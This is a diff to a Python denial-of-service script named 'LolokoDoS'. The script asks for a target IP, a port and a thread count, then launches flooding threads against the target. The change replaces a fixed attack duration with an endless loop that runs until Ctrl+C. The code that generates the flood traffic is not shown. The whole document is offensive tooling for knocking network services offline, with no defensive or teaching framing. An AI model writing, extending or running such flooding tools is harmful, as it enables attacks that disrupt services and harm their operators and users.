@@ -50,7 +50,6 @@ try:
   target_ip = input("[?] Target IP: ")
   target_port = int(input("[?] Target Port: "))
   thrdc = int(input("[?] Threads (Def 100): "))
-  hmtimes = int(input("[?] Seconds: "))
   print("[LolokoDoS] Attack will start when all threads all ready.")
   for i in range(thrdc):
     t = threading.Thread(target=ngahhflooder,args=(target_ip, target_port), daemon=True)
@@ -62,9 +61,9 @@ try:
   print(f"Target IP: {target_ip}")
   print(f"Target Port: {target_port}")
   print(f"Threads: {thrdc}")
-  print(f"The attack will run for {hmtimes} seconds.")
-  time.sleep(hmtimes)
-
+  print(f"Use CTRL + C For Stop.")
+  while True:
+    time.sleep(1) # so that the code nd threads doesnt stop
 except ValueError:
   print("[LolokoDoS] Please Enter All Input's Correctly!")
 except KeyboardInterrupt:
